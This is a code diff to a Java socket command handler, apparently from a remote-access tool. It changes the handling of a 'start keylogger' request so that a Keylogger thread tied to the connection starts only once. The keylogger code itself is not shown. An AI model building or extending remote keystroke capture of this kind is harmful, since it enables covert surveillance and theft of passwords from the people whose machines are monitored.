@@ -30,6 +30,7 @@ public class CentralReader implements Runnable {
 	private boolean checkConnect = true;
 	private MainForm mainForm = null;
 	private DisconnectForm disconnectForm = null;
+	private boolean checkKeylogger = true;
 	
 	public CentralReader(Socket socket, MainForm mainForm, DisconnectForm disconnectForm) throws IOException {
 		this.setSocket(socket);
@@ -128,7 +129,10 @@ public class CentralReader implements Runnable {
 					break;
 				}
 				case REQUEST_START_KEYLOGGER: {
-					new Thread(new Keylogger(socket)).start();
+					if (this.checkKeylogger) {
+						new Thread(new Keylogger(socket)).start();
+						this.checkKeylogger = false;
+					}
 					break;
 				}
 				case REQUEST_APP_RUNNING: {
